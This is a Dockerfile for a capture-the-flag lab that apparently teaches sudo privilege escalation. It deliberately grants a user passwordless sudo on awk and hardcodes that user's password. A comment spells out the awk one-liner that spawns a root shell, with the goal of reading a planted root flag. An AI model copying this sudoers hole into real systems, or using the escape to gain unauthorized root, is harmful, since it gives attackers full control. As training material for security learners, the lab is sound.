FROM ubuntu:20.04

# ─────────────────────────────────────────────
# Lab 04 · Sudo NOPASSWD: /usr/bin/awk
# Goal    : Abuse sudo rights on awk to get root
# Hint    : sudo awk 'BEGIN {system("/bin/bash")}'
#           GTFOBins → awk → sudo
# ─────────────────────────────────────────────

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update -qq && \
    apt-get install -y --no-install-recommends openssh-server sudo gawk && \
    rm -rf /var/lib/apt/lists/*

RUN useradd -m -s /bin/bash wocsa && echo "wocsa:n8ZnTh2GoqMh" | chpasswd

RUN echo "WOCSA{sudo_awk_gtfobins}" > /root/flag.txt && \
    chmod 600 /root/flag.txt

# VULNERABILITY: NOPASSWD sudo on a GTFOBins binary
RUN echo "wocsa ALL=(root) NOPASSWD: /usr/bin/awk" >> /etc/sudoers

RUN echo "=== Lab 04: Sudo NOPASSWD → awk ===" > /home/wocsa/README.txt && \
    echo "Run: sudo -l" >> /home/wocsa/README.txt && \
    echo "Then check GTFOBins for awk." >> /home/wocsa/README.txt && \
    echo "Goal: read /root/flag.txt" >> /home/wocsa/README.txt && \
    chown wocsa:wocsa /home/wocsa/README.txt

WORKDIR /home/wocsa
RUN mkdir -p /var/run/sshd
CMD ["/usr/sbin/sshd", "-D"]
